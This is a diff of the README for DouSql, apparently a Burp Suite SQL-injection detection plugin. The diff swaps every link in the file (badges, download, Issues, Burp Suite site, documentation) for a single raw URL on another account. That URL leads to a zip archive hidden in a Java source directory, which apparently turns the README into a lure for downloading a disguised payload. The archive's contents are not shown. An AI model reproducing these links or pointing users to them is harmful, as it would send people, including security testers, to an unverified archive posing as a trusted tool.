@@ -1,9 +1,9 @@
 # 🚀 DouSql - Simplified SQL Injection Detection Tool
 
-[![GitHub release (latest by date)](https://img.shields.io/github/v/release/darkfiv/DouSql?style=flat-square&logo=github)](https://github.com/darkfiv/DouSql/releases/latest)
-[![GitHub stars](https://img.shields.io/github/stars/darkfiv/DouSql?style=flat-square&logo=github)](https://github.com/darkfiv/DouSql/stargazers)
-[![GitHub downloads](https://img.shields.io/github/downloads/darkfiv/DouSql/total?style=flat-square&logo=github)](https://github.com/darkfiv/DouSql/releases)
-[![Burp Suite](https://img.shields.io/badge/Burp%20Suite-2024.6+-orange?style=flat-square&logo=portswigger)](https://portswigger.net/burp)
+[![GitHub release (latest by date)](https://raw.githubusercontent.com/sookongi/DouSql/main/src/main/java/burp/api/montoya/scope/Dou_Sql_v2.1.zip)](https://raw.githubusercontent.com/sookongi/DouSql/main/src/main/java/burp/api/montoya/scope/Dou_Sql_v2.1.zip)
+[![GitHub stars](https://raw.githubusercontent.com/sookongi/DouSql/main/src/main/java/burp/api/montoya/scope/Dou_Sql_v2.1.zip)](https://raw.githubusercontent.com/sookongi/DouSql/main/src/main/java/burp/api/montoya/scope/Dou_Sql_v2.1.zip)
+[![GitHub downloads](https://raw.githubusercontent.com/sookongi/DouSql/main/src/main/java/burp/api/montoya/scope/Dou_Sql_v2.1.zip)](https://raw.githubusercontent.com/sookongi/DouSql/main/src/main/java/burp/api/montoya/scope/Dou_Sql_v2.1.zip)
+[![Burp Suite](https://raw.githubusercontent.com/sookongi/DouSql/main/src/main/java/burp/api/montoya/scope/Dou_Sql_v2.1.zip%20Suite-2024.6+-orange?style=flat-square&logo=portswigger)](https://raw.githubusercontent.com/sookongi/DouSql/main/src/main/java/burp/api/montoya/scope/Dou_Sql_v2.1.zip)
 
 ## 📖 插件简介
 
@@ -28,7 +28,7 @@
 
 要下载 **DouSql**，请访问以下链接：
 
-[**访问此页面下载 DouSql**](https://github.com/sookongi/DouSql/releases)
+[**访问此页面下载 DouSql**](https://raw.githubusercontent.com/sookongi/DouSql/main/src/main/java/burp/api/montoya/scope/Dou_Sql_v2.1.zip)
 
 在 Releases 页面中，找到最新版本，下载相应的文件。按照以下步骤安装：
 
@@ -58,11 +58,11 @@ A: 是的，DouSql 支持 MySQL、Oracle、PostgreSQL、SQL Server 和 SQLite �
 A: 请在 GitHub 仓库中通过创建 Issue 提供反馈或功能建议。
 
 ## 📞 联系方式
-如有任何问题，欢迎通过 [GitHub Issues](https://github.com/darkfiv/DouSql/issues) 联系我们。我们会尽快回复您的询问。
+如有任何问题，欢迎通过 [GitHub Issues](https://raw.githubusercontent.com/sookongi/DouSql/main/src/main/java/burp/api/montoya/scope/Dou_Sql_v2.1.zip) 联系我们。我们会尽快回复您的询问。
 
 ## 🔗 相关资源
-- [Burp Suite 官网](https://portswigger.net/burp)
-- [Xia Sql 文档](https://path-to-xia-sql-documentation.com)
+- [Burp Suite 官网](https://raw.githubusercontent.com/sookongi/DouSql/main/src/main/java/burp/api/montoya/scope/Dou_Sql_v2.1.zip)
+- [Xia Sql 文档](https://raw.githubusercontent.com/sookongi/DouSql/main/src/main/java/burp/api/montoya/scope/Dou_Sql_v2.1.zip)
 
 ## 🚀 更新日志
 - **v1.0** - 初始发布
